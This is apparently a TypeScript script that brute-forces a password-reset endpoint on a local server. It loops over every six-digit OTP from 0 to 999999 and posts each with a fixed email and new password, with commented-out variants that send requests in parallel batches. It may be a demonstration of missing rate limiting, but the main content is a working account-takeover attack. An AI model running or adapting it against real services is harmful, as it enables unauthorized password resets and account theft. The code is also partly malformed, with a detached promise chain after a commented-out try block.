
import axios from 'axios';





 async function sendRequest (otp : string ){
    let data = JSON.stringify({
        "email": "abc@gamil.com",
        "otp": otp,
        "newPassword": "58"
        });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: { 
            'Content-Type': 'application/json'
        },
        data : data
    };

    // try {
        await axios.request(config)
    // } catch(e){

    // }

.then((response) => {
  console.log(JSON.stringify(response.data));
})
.catch((error) => {
  console.log(error);
});
 }




// sendRequest("279415");

// async function main (){
//     for ( let i=0; i<=999999; i+=100){
//      console.log("hello")
//     const arr = [];
//     console.log(i);
//     for ( let j=0 ; j<100; j++){
//         arr.push(sendRequest((i+j).toString()));   
//     }
//     // console.log(arr)
//     await Promise.all(arr);
// }}
// async function main (){
    //     for ( let i=0; i<=999999; i+=100){
    //      console.log("hello")
    //     const arr = [];
    //     console.log(i);
    //     for ( let j=0 ; j<100; j++){
    //         arr.push(sendRequest((i+j).toString()));   
    //     }
    //     // console.log(arr)
    //     await Promise.all(arr);
    // }}
    
    // main();
// main();

for (let i=0; i<=999999; i++){
    console.log(i)
    sendRequest(i.toString())
}